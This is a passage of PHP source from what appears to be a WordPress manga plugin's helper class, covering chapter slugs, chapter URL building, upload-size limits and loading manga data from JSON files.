			if ( is_tax( 'wp-manga-genre' ) || is_tax( 'wp-manga-release' ) || is_tax( 'wp-manga-tag' ) || is_tax( 'wp-manga-author' ) || is_tax( 'wp-manga-artist' ) || $this->is_manga_posttype_archive() ) {
				return true;
			}

			return false;

		}

		function is_wp_manga_page() {

			if ( $this->is_manga_archive() || $this->is_manga_reading_page() || $this->is_manga_single() || $this->is_manga_search_page() ) {
				return true;
			}

			return false;

		}

		function unique_slug( $post_id, $c_name ) {

			global $wp_manga_chapter, $wp_manga_volume, $wp_manga_storage;

			$args = array(
				'post_id'      => $post_id,
				'chapter_name' => $c_name,
			);

			$chapters  = $wp_manga_chapter->get_chapters( $args );
			$slugified = $wp_manga_storage->slugify( $c_name );

			if ( $chapters ) {

				$chapters_slug = array_column( $chapters, 'chapter_slug' );

				$i = 0;

				do {
					$i ++;
					$new_slugified = $slugified . '_' . $i;
				} while ( in_array( $new_slugified, $chapters_slug ) );

				return $new_slugified;

			}

			return $slugified;

		}

		function check_unique_chapter( $c_name, $volume, $post_id ) {

			if ( empty( $c_name ) || empty( $post_id ) ) {
				return 'false';
			}

			global $wp_manga_chapter, $wp_manga_volume, $wp_manga_storage;

			$args = array(
				'post_id'      => $post_id,
				'chapter_name' => $c_name,
			);

			$chapters = $wp_manga_chapter->get_chapters( $args );

			$chapters_slug = array_column( $chapters, 'chapter_slug' );
			$slugified     = $wp_manga_storage->slugify( $c_name );

			if ( $chapters ) {

				$i = 0;

				do {
					$i ++;
					$new_slugified = $slugified . '_' . $i;
				} while ( in_array( $new_slugified, $chapters_slug ) );

				if ( ! in_array( $volume, array_column( $chapters, 'volume_id' ) ) ) {
					return array( 'c_uniq_slug' => $new_slugified, 'overwrite' => false );
				}

				$output = '';
				foreach ( $chapters as $c ) {

					if ( $c['volume_id'] != 0 ) {
						$this_volume = $wp_manga_volume->get_volume_by_id( $post_id, $c['volume_id'] );
						$this_volume = $this_volume['volume_name'];
					} else {
						$this_volume = __( 'No Volume', WP_MANGA_TEXTDOMAIN );
					}

					$output .= '<label><input type="radio" name="chapter-to-overwrite" value="' . $c['chapter_id'] . '"><span>' . $c['chapter_name'] . $this->filter_extend_name( $c['chapter_name_extend'] ) . ' (' . $this_volume . ')</span></label><br>';
				}

				return array( 'c_uniq_slug' => $new_slugified, 'output' => $output );
			} else {
				return 'false';
			}

		}

		function validate_size_setting( $file_size ) {

			$size = rtrim( $file_size, 'M' );

			if ( ! is_numeric( $size ) ) {
				$size = rtrim( $file_size, 'G' );
				$size *= 1024;
			}

			if ( $size <= 10 ) {
				return 'low';
			} elseif ( 10 < $size && $size <= 64 ) {
				return 'medium';
			} elseif ( 64 <= $size ) {
				return 'high';
			}

			return false;

		}

		function validate_time_setting( $time ) {

			if ( $time <= 60 ) {
				return 'low';
			} elseif ( 60 < $time && $time < 300 ) {
				return 'medium';
			} elseif ( 300 <= $time ) {
				return 'high';
			}

			return false;
		}

		function filter_extend_name( $chapter_name_extend ) {

			if ( ! empty( $chapter_name_extend ) ) {
				return ' - ' . $chapter_name_extend;
			}

			return '';

		}

		function parse_chapter_full_name( $chapter ) {

			if ( empty( $chapter ) || ! isset( $chapter['chapter_name_extend'] ) ) {
				return null;
			}

			return $chapter['chapter_name'] . $this->filter_extend_name( $chapter['chapter_name_extend'] );

		}

		function build_chapter_url( $post_id, $chapter_slug, $page_style = null, $host = null, $paged = null ) {

			global $wp_manga_chapter, $wp_manga_volume, $wp_manga_storage;

			$chapter = $wp_manga_chapter->get_chapter_by_slug( $post_id, $chapter_slug );

			$url = get_the_permalink( $post_id );

			$addition_params = array();

			//get and remove query string from URL
			$query_string = parse_url( $url, PHP_URL_QUERY );
			if ( $query_string ) {
				//remove
				$url = trim( $url, $query_string );

				parse_str( $query_string, $query_vars );
				if ( ! empty( $query_vars ) ) {
					$addition_params = array_merge( $addition_params, $query_vars );
				}
			}

			$is_slug_structure = ! get_option( 'permalink_structure' ) || get_post_status( $post_id ) !== 'publish' ? false : true;

			//remove some special characters
			$url = trim( $url, '/' );
			$url = trim( $url, '?' );

			//volume path
			if ( ! empty( $chapter['volume_id'] ) ) {
				$volume = $wp_manga_volume->get_volume_by_id( $post_id, $chapter['volume_id'] );

				if ( $volume ) {
					$volume_slug = $wp_manga_storage->slugify( $volume['volume_name'] );
					if ( ! $is_slug_structure ) {
						$url = add_query_arg( array( 'volume' => $volume_slug ), $url );
					} else {
						$url .= '/' . $volume_slug;
					}
				}
			}

			//if permalink structure is ?p= or the post haven't be published yet, then use normal query url
			if ( ! $is_slug_structure ) {
				$url = add_query_arg( array( 'chapter' => $chapter_slug ), $url );
			} else {
				$url .= '/' . $chapter_slug;
			}

			//remove page style if it's not manga chapter
			$chapter_type = get_post_meta( $post_id, '_wp_manga_chapter_type', true );

			if ( $page_style && $page_style == 'list' && $chapter_type != 'text' && $chapter_type != 'video' ) {
				$addition_params['style'] = $page_style;
			}

			if ( $chapter_type != 'text' && $chapter_type != 'video' && $host ) {
				$addition_params['host'] = $host;
			}

			if ( $paged && $page_style != 'list' ) {
				$addition_params['manga-paged'] = $paged;
			}

			if ( ! empty( $addition_params ) ) {
				$url = add_query_arg( $addition_params, $url );
			}

			return $url;

		}

		function get_ini_file_size( $name ) {

			$filesize = ini_get( $name );

			$filesize = strtolower( $filesize );

			$filesize = rtrim( $filesize, 'm' );
			$filesize = rtrim( $filesize, 'mb' );

			if ( ! is_numeric( $filesize ) ) {
				$filesize = rtrim( $filesize, 'g' );
				$filesize = rtrim( $filesize, 'gb' );

				if ( is_numeric( $filesize ) ) {
					$filesize *= 1024;
				} else {
					return 0;
				}
			}

			return $filesize;

		}

		function max_upload_file_size() {

			$upload_max_filesize = $this->get_ini_file_size( 'upload_max_filesize' );
			$post_max_size       = $this->get_ini_file_size( 'post_max_size' );

			if ( $upload_max_filesize <= $post_max_size ) {
				$actual_max_filesize = $upload_max_filesize;
			} else {
				$actual_max_filesize = $post_max_size;
			}

			return array(
				'actual_max_filesize'    => intval( $actual_max_filesize ) * 1000,
				'actual_max_filesize_mb' => intval( $actual_max_filesize ),
				'upload_max_filesize'    => intval( $upload_max_filesize ) * 1000,
				'post_max_size'          => intval( $post_max_size ) * 1000
			);
		}

		function update_latest_meta( $post_id ) {

			$new_date = current_time( 'timestamp', false );
			$old_date = get_post_meta( $post_id, '_latest_update', true );

			do_action( 'manga_update_chapter', $post_id );

			return update_post_meta( $post_id, '_latest_update', $new_date, $old_date );

		}

		function get_chapter( $post_id, $return_chapters_only = false ) {
			global $wp_manga;
			$uniqid       = $wp_manga->get_uniqid( $post_id );
			$json_storage = WP_MANGA_JSON_DIR . $uniqid . '/manga.json';
			if ( file_exists( $json_storage ) ) {
				$raw  = file_get_contents( $json_storage );
				$data = json_decode( $raw, true );

				if ( isset( $data['chapters'] ) ) {
					$chapters['total_chapters'] = count( $data['chapters'] );
					$chapters['chapters'] = $data['chapters'];

					if( $return_chapters_only ){
						return $chapters['chapters'];
					}

					return $chapters;
				}
			}

			return false;
		}

		function get_manga( $post_id ) {
			global $wp_manga;
			$uniqid              = $wp_manga->get_uniqid( $post_id );
			$manga_json_file_dir = WP_MANGA_JSON_DIR . $uniqid . '/manga.json';

			if ( file_exists( $manga_json_file_dir ) ) {
				$manga_json = file_get_contents( $manga_json_file_dir );
				$manga      = json_decode( $manga_json, true );

				if ( is_array( $manga ) ) {
					return $manga;
				}
			}

			return false;
		}

		function get_hosts( $post_id, $chapter_id ) {
			global $wp_manga;
			$uniqid       = $wp_manga->get_uniqid( $post_id );
			$json_storage = WP_MANGA_JSON_DIR . $uniqid . '/manga.json';
			if ( file_exists( $json_storage ) ) {
				$raw     = file_get_contents( $json_storage );
				$data    = json_decode( $raw, true );
				$storage = $data['chapters'][ $chapter_id ]['storage'];

				return $storage;
			} else {
				return false;
			}
		}

		function get_chapter_hosts( $post_id, $chapter_id ) {

			$host = $this->get_hosts( $post_id, $chapter_id );

			if ( $host == false ) {
				return false;
			}

			$host_arr = array();
			foreach ( $host as $key => $value ) {
				if ( 'inUse' != $key ) {
					$host_arr[] = $key;
				}
			}

			return $host_arr;

		}

		function get_single_chapter( $post_id, $chapter_id ) {
			global $wp_manga;
			$uniqid       = $wp_manga->get_uniqid( $post_id );
			$json_storage = WP_MANGA_JSON_DIR . $uniqid . '/manga.json';
			if ( file_exists( $json_storage ) ) {
				$raw = file_get_contents( $json_storage );

				$data = json_decode( $raw, true );

				return $data['chapters'][ $chapter_id ];
			} else {
				return false;
			}
		}

	}

	$GLOBALS['wp_manga_functions'] = new WP_MANGA_FUNCTIONS();
